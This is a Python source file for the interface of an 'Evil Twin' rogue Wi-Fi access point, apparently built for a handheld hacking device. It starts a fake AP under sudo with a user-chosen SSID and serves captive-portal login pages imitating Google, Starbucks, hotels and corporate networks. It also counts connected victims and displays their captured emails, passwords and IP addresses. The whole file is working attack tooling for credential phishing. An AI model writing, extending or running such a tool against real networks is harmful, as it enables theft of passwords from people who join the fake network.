"""
apps/tools/evil_twin/app.py
Evil Twin / Captive Portal — rogue AP with fake login page.

Screens:
  CONFIG  — set SSID (keyboard), channel, template
  RUNNING — live stats: connected clients, captured creds
  CREDS   — view captured credentials
  STOP    — confirm stop

Controls:
  CONFIG screen:
    UP / DOWN    — select field
    LEFT / RIGHT — change value (channel, template)
    CENTER       — edit SSID (row 0) / start AP (row 3)
    KEY1         — start AP directly
    KEY3         — exit

  RUNNING screen:
    KEY1         — view captured creds
    KEY3         — stop AP

  CREDS screen:
    UP / DOWN    — scroll
    KEY3         — back

  STOP screen:
    CENTER       — confirm stop
    KEY3         — cancel
"""

import os
import json
import time
import subprocess
import threading
from PIL import Image, ImageDraw

from core.ui_keyboard import OnScreenKeyboard

TOP_H = 26
BOT_H = 18
ROW_H = 34

BG     = (4,   8,   16)
HDR_BG = (8,   14,  28)
SEL_BG = (12,  25,  50)
SEP    = (25,  45,  75)
SEP_HI = (50,  90,  140)
WHITE  = (220, 235, 255)
DIM    = (70,  100, 140)
HINT   = (50,  75,  110)
CYAN   = (0,   210, 255)
GREEN  = (50,  220, 120)
YELLOW = (255, 200, 50)
RED    = (255, 70,  70)
ORANGE = (255, 140, 30)
PURPLE = (160, 80,  255)

LOG_FILE  = "/tmp/evil_twin_creds.log"
SCRIPT    = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "..", "..", "..", "scripts", "evil_twin.sh"
)
PORTAL_PY = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "portal_server.py"
)
PORTALS_DIR = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "..", "..", "..", "menu_fs", "04_files", "portals"
)

STATE_CONFIG  = "config"
STATE_KEYBOARD = "keyboard"
STATE_BUSY    = "busy"
STATE_RUNNING = "running"
STATE_CREDS   = "creds"
STATE_STOP    = "stop"

BUILTIN_TEMPLATES = ["generic", "google", "starbucks", "hotel", "corporate"]
CHANNELS          = [1, 6, 11]


def _get_templates() -> list:
    """Return combined list: built-ins + HTML files from portals dir."""
    templates = list(BUILTIN_TEMPLATES)
    portals_dir = os.path.realpath(PORTALS_DIR)
    if os.path.isdir(portals_dir):
        for f in sorted(os.listdir(portals_dir)):
            if f.endswith(".html"):
                name = f[:-5]  # strip .html
                if name not in templates:
                    templates.append(name)
    return templates


class EvilTwinApp:
    def __init__(self, hw, fonts, monitor=None):
        self.hw = hw
        self.font_big, self.font_small, self.font_label = fonts

        self.state        = STATE_CONFIG
        self.sel          = 0
        self.ssid         = "Free WiFi"
        self.channel_idx  = 1    # default ch6
        self.tmpl_idx     = 0

        self.templates    = _get_templates()
        self.creds        = []
        self.creds_scroll = 0
        self.client_count = 0

        self._portal_proc   = None
        self._running       = False
        self._dirty         = True

        self._keyboard = OnScreenKeyboard(hw.disp, self.font_label)

    def _ts(self, draw, text, font):
        b = draw.textbbox((0, 0), text, font=font)
        return b[2] - b[0], b[3] - b[1]

    def _trunc(self, draw, text, font, max_w):
        while text:
            w, _ = self._ts(draw, text, font)
            if w <= max_w:
                return text
            text = text[:-2] + "…"
        return ""

    # ── Lifecycle ─────────────────────────────────────────────

    def on_enter(self):
        self.templates = _get_templates()
        self.state     = STATE_CONFIG
        self.sel       = 0
        self._dirty    = True

    def on_event(self, event) -> str:
        if self.state == STATE_BUSY:
            return "stay"
        if self.state == STATE_KEYBOARD:
            return self._ev_keyboard(event)
        if self.state == STATE_CONFIG:
            return self._ev_config(event)
        if self.state == STATE_RUNNING:
            return self._ev_running(event)
        if self.state == STATE_CREDS:
            return self._ev_creds(event)
        if self.state == STATE_STOP:
            return self._ev_stop(event)
        return "stay"

    # ── Config screen events ──────────────────────────────────

    def _ev_config(self, event) -> str:
        ROWS = 4  # SSID, Channel, Template, [Start]
        if event == "KEY3":
            return "exit"
        if event == "KEY1":
            self._start_ap()
            return "stay"
        if event == "UP" and self.sel > 0:
            self.sel -= 1
            self._dirty = True
        elif event == "DOWN" and self.sel < ROWS - 1:
            self.sel += 1
            self._dirty = True
        elif event in ("LEFT", "RIGHT"):
            d = 1 if event == "RIGHT" else -1
            if self.sel == 1:
                self.channel_idx = (self.channel_idx + d) % len(CHANNELS)
                self._dirty = True
            elif self.sel == 2:
                self.tmpl_idx = (self.tmpl_idx + d) % len(self.templates)
                self._dirty = True
        elif event == "CENTER":
            if self.sel == 0:
                # Open keyboard for SSID
                self._keyboard.start("SSID", initial_text=self.ssid, max_len=32)
                self.state  = STATE_KEYBOARD
                self._dirty = True
            else:
                self._start_ap()
        return "stay"

    # ── Keyboard screen events ────────────────────────────────

    def _ev_keyboard(self, event) -> str:
        if event == "KEY2":
            # Confirm — save SSID
            self.ssid   = self._keyboard.text
            self.state  = STATE_CONFIG
            self._dirty = True
            return "stay"
        if event == "KEY3":
            # Cancel
            self.state  = STATE_CONFIG
            self._dirty = True
            return "stay"
        if event == "KEY1":
            self._keyboard.cycle_language()
            action, _ = "redraw", None
        else:
            action, text = self._keyboard.handle_event(event)
            if action == "done":
                self.ssid   = text
                self.state  = STATE_CONFIG
                self._dirty = True
                return "stay"

        if action == "redraw":
            self._keyboard.draw()
        return "stay"

    # ── Running screen events ─────────────────────────────────

    def _ev_running(self, event) -> str:
        if event == "KEY1":
            self._load_creds()
            self.creds_scroll = 0
            self.state  = STATE_CREDS
            self._dirty = True
        elif event == "KEY3":
            self.state  = STATE_STOP
            self._dirty = True
        return "stay"

    # ── Creds screen events ───────────────────────────────────

    def _ev_creds(self, event) -> str:
        if event == "KEY3":
            self.state  = STATE_RUNNING
            self._dirty = True
        elif event == "UP" and self.creds_scroll > 0:
            self.creds_scroll -= 1
            self._dirty = True
        elif event == "DOWN" and self.creds_scroll < max(0, len(self.creds) - 1):
            self.creds_scroll += 1
            self._dirty = True
        return "stay"

    # ── Stop confirm events ───────────────────────────────────

    def _ev_stop(self, event) -> str:
        if event == "KEY3":
            self.state  = STATE_RUNNING
            self._dirty = True
        elif event == "CENTER":
            self._stop_ap()
        return "stay"

    # ── AP control ────────────────────────────────────────────

    def _start_ap(self):
        self.state  = STATE_BUSY
        self._dirty = True
        threading.Thread(target=self._do_start, daemon=True).start()

    def _do_start(self):
        # Ensure portals dir exists
        portals_dir = os.path.realpath(PORTALS_DIR)
        os.makedirs(portals_dir, exist_ok=True)

        channel = CHANNELS[self.channel_idx]
        script  = os.path.realpath(SCRIPT)
        r = subprocess.run(
            ["sudo", "bash", script, "start", self.ssid, str(channel)],
            capture_output=True, timeout=30
        )
        if r.returncode != 0:
            self.state  = STATE_CONFIG
            self._dirty = True
            return

        # Resolve template — built-in name or path to HTML file
        tmpl_name   = self.templates[self.tmpl_idx]
        html_path   = os.path.join(os.path.realpath(PORTALS_DIR), tmpl_name + ".html")
        tmpl_arg    = html_path if os.path.isfile(html_path) else tmpl_name

        portal = os.path.realpath(PORTAL_PY)
        self._portal_proc = subprocess.Popen(
            ["sudo", "python3", portal, tmpl_arg, LOG_FILE],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        self._running = True
        self.state    = STATE_RUNNING
        self._dirty   = True

        threading.Thread(target=self._monitor_loop, daemon=True).start()

    def _stop_ap(self):
        self.state  = STATE_BUSY
        self._dirty = True
        threading.Thread(target=self._do_stop, daemon=True).start()

    def _do_stop(self):
        self._running = False
        if self._portal_proc:
            try:
                self._portal_proc.terminate()
            except Exception:
                pass
            self._portal_proc = None
        script = os.path.realpath(SCRIPT)
        subprocess.run(["sudo", "bash", script, "stop"],
                       capture_output=True, timeout=30)
        self.state  = STATE_CONFIG
        self._dirty = True

    def _monitor_loop(self):
        while self._running:
            self._update_clients()
            self._load_creds()
            self._dirty = True
            time.sleep(2)

    def _update_clients(self):
        try:
            with open("/var/lib/misc/dnsmasq.leases") as f:
                self.client_count = sum(1 for l in f if l.strip())
        except Exception:
            try:
                r = subprocess.run(["arp", "-n", "-i", "wlan0"],
                                   capture_output=True, timeout=3)
                self.client_count = sum(
                    1 for l in r.stdout.decode().splitlines()
                    if "192.168.66." in l and "incomplete" not in l
                )
            except Exception:
                pass

    def _load_creds(self):
        try:
            if not os.path.exists(LOG_FILE):
                return
            with open(LOG_FILE, encoding="utf-8") as f:
                self.creds = [json.loads(l) for l in f if l.strip()]
        except Exception:
            pass

    def update(self, dt):
        pass

    # ── Draw ──────────────────────────────────────────────────

    def draw(self):
        if not self._dirty:
            return
        self._dirty = False

        # Keyboard has its own draw
        if self.state == STATE_KEYBOARD:
            self._keyboard.draw()
            return

        W, H = self.hw.W, self.hw.H
        img  = Image.new("RGB", (W, H), BG)
        d    = ImageDraw.Draw(img)

        # Header
        d.rectangle([(0, 0), (W, TOP_H)], fill=HDR_BG)
        d.rectangle([(0, 0), (3, TOP_H)], fill=RED)
        tw, th = self._ts(d, "EVIL TWIN", self.font_label)
        d.text((10, (TOP_H - th) // 2), "EVIL TWIN",
               font=self.font_label, fill=RED)

        if self.state == STATE_RUNNING:
            status = "● LIVE"
            sw, sh = self._ts(d, status, self.font_label)
            d.text((W - sw - 6, (TOP_H - sh) // 2),
                   status, font=self.font_label, fill=GREEN)

        d.line([(0, TOP_H), (W, TOP_H)], fill=SEP_HI, width=1)

        if self.state == STATE_CONFIG:
            self._draw_config(d, W, H)
        elif self.state == STATE_BUSY:
            self._draw_busy(d, W, H)
        elif self.state == STATE_RUNNING:
            self._draw_running(d, W, H)
        elif self.state == STATE_CREDS:
            self._draw_creds(d, W, H)
        elif self.state == STATE_STOP:
            self._draw_stop(d, W, H)

        self.hw.show(img)

    def _hint(self, d, W, H, text):
        d.line([(0, H - BOT_H), (W, H - BOT_H)], fill=SEP, width=1)
        text = self._trunc(d, text, self.font_label, W - 4)
        tw, th = self._ts(d, text, self.font_label)
        d.text(((W - tw) // 2, H - th - 2), text,
               font=self.font_label, fill=HINT)

    def _draw_config(self, d, W, H):
        M = 8
        y = TOP_H + 6

        tmpl_name = self.templates[self.tmpl_idx] if self.templates else "—"

        rows = [
            ("SSID",     self.ssid,                      CYAN),
            ("Channel",  str(CHANNELS[self.channel_idx]), YELLOW),
            ("Template", tmpl_name,                      PURPLE),
            ("",         "▶  START AP",                  GREEN),
        ]

        for i, (label, val, color) in enumerate(rows):
            is_sel = i == self.sel
            y1 = y + ROW_H

            if is_sel:
                d.rectangle([(0, y), (W, y1 - 1)], fill=SEL_BG)
                d.rectangle([(0, y), (3, y1 - 1)], fill=color)

            if label:
                lw, lh = self._ts(d, label, self.font_label)
                d.text((M + 6, y + 4), label,
                       font=self.font_label,
                       fill=WHITE if is_sel else DIM)
                val_t = self._trunc(d, val, self.font_label, W - lw - M * 3)
                vw, vh = self._ts(d, val_t, self.font_label)
                d.text((W - vw - M, y + 4), val_t,
                       font=self.font_label, fill=color if is_sel else DIM)
                # Second line: larger value
                val2 = self._trunc(d, val, self.font_label, W - M * 2 - 6)
                d.text((M + 6, y + lh + 6), val2,
                       font=self.font_label,
                       fill=color if is_sel else (40, 60, 90))
            else:
                # Start button row
                vw, vh = self._ts(d, val, self.font_label)
                d.text(((W - vw) // 2, y + (ROW_H - vh) // 2),
                       val, font=self.font_label, fill=color)

            d.line([(0, y1 - 1), (W, y1 - 1)], fill=SEP, width=1)
            y += ROW_H

        self._hint(d, W, H, "LR:ch/tmpl  CTR:edit/start  K3:exit")

    def _draw_busy(self, d, W, H):
        msg = "Starting AP..."
        mw, mh = self._ts(d, msg, self.font_label)
        cy = TOP_H + (H - TOP_H) // 2
        d.text(((W - mw) // 2, cy - mh // 2),
               msg, font=self.font_label, fill=CYAN)

    def _draw_running(self, d, W, H):
        M  = 8
        y  = TOP_H + 8
        lh = self.font_label.size + 4

        for label, val, color in [
            ("SSID",     self.ssid,                          CYAN),
            ("Channel",  f"ch{CHANNELS[self.channel_idx]}", DIM),
            ("Template", self.templates[self.tmpl_idx],     PURPLE),
            ("Clients",  str(self.client_count),            CYAN if self.client_count else DIM),
            ("Captured", str(len(self.creds)),              RED if self.creds else DIM),
        ]:
            lw, lh2 = self._ts(d, label + ":", self.font_label)
            d.text((M, y), label + ":", font=self.font_label, fill=DIM)
            val_t = self._trunc(d, val, self.font_label, W - lw - M * 2 - 6)
            d.text((M + lw + 4, y), val_t, font=self.font_label, fill=color)
            y += lh2 + 4

        if self.creds:
            d.line([(M, y + 2), (W - M, y + 2)], fill=SEP, width=1)
            last    = self.creds[-1]
            preview = self._trunc(d, last.get("email", "?"), self.font_label, W - M * 2)
            d.text((M, y + 6), preview, font=self.font_label, fill=YELLOW)

        self._hint(d, W, H, "K1:creds  K3:stop")

    def _draw_creds(self, d, W, H):
        M  = 5
        lh = self.font_label.size + 3
        y  = TOP_H + 4

        if not self.creds:
            msg = "No credentials yet"
            mw, mh = self._ts(d, msg, self.font_label)
            d.text(((W - mw) // 2, y + 24),
                   msg, font=self.font_label, fill=DIM)
        else:
            cnt = f"{len(self.creds)} captured"
            cw, _ = self._ts(d, cnt, self.font_label)
            d.text((W - cw - 4, y), cnt, font=self.font_label, fill=DIM)
            y += lh + 2

            for entry in self.creds[self.creds_scroll: self.creds_scroll + 3]:
                email = self._trunc(d, entry.get("email", "?"), self.font_label, W - M * 2)
                pw    = self._trunc(d, entry.get("password", ""), self.font_label, W - M * 2)
                info  = f"{entry.get('ip','')}  {entry.get('time','')[-8:]}"

                d.text((M, y), email, font=self.font_label, fill=YELLOW)
                y += lh
                d.text((M, y), pw, font=self.font_label, fill=WHITE)
                y += lh
                d.text((M, y), info, font=self.font_label, fill=DIM)
                y += lh + 4
                d.line([(M, y), (W - M, y)], fill=SEP, width=1)
                y += 4

        self._hint(d, W, H, "UP/DN:scroll  K3:back")

    def _draw_stop(self, d, W, H):
        cy = TOP_H + (H - TOP_H - BOT_H) // 2
        for j, (line, color) in enumerate([
            ("Stop Evil Twin?", WHITE),
            ("AP will shut down,", DIM),
            ("Wi-Fi reconnects.", DIM),
        ]):
            lw, lh = self._ts(d, line, self.font_label)
            d.text(((W - lw) // 2, cy - 20 + j * (lh + 4)),
                   line, font=self.font_label, fill=color)
        self._hint(d, W, H, "CTR:confirm  K3:cancel")
